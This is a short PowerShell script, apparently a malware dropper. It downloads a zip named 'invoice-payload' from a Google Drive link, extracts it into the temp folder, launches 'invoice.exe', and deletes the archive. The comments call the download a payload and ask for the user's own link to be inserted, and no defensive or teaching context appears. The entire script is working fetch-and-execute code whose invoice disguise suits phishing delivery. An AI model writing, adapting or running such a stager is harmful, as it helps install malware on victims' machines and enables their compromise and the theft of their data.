# URL for the direct download of the zipped payload.
# IMPORTANT: Replace this with your actual direct download link.
$download_url = "https://drive.google.com/uc?export=download&id=1_KiNUKnEaqyT_iFhF_VHuCBSWWV8d_2O"

# Path to save the downloaded zip file.
$zip_path = Join-Path $env:TEMP "invoice-payload.zip"

# Path to extract the contents of the zip file.
$extract_path = Join-Path $env:TEMP "invoice-payload"

# --- Main Script ---

# Download the zip file from the specified URL.
try {
    Invoke-WebRequest -Uri $download_url -OutFile $zip_path
    Write-Host "Download complete."
} catch {
    Write-Host "Error downloading file: $_"
    exit 1
}

# Unzip the downloaded file.
try {
    Expand-Archive -Path $zip_path -DestinationPath $extract_path -Force
    Write-Host "Extraction complete."
} catch {
    Write-Host "Error extracting file: $_"
    # Clean up the downloaded zip file before exiting.
    Remove-Item -Path $zip_path -ErrorAction SilentlyContinue
    exit 1
}

# Path to the executable to be run.
$exe_path = Join-Path $extract_path "invoice-win32-x64\invoice.exe"

# Check if the executable exists.
if (Test-Path $exe_path) {
    # Run the executable.
    try {
        Start-Process -FilePath $exe_path
        Write-Host "Executable started."
    } catch {
        Write-Host "Error starting executable: $_"
    }
} else {
    Write-Host "Executable not found at path: $exe_path"
}

# Clean up the downloaded zip file.
Remove-Item -Path $zip_path -ErrorAction SilentlyContinue
Write-Host "Cleanup complete."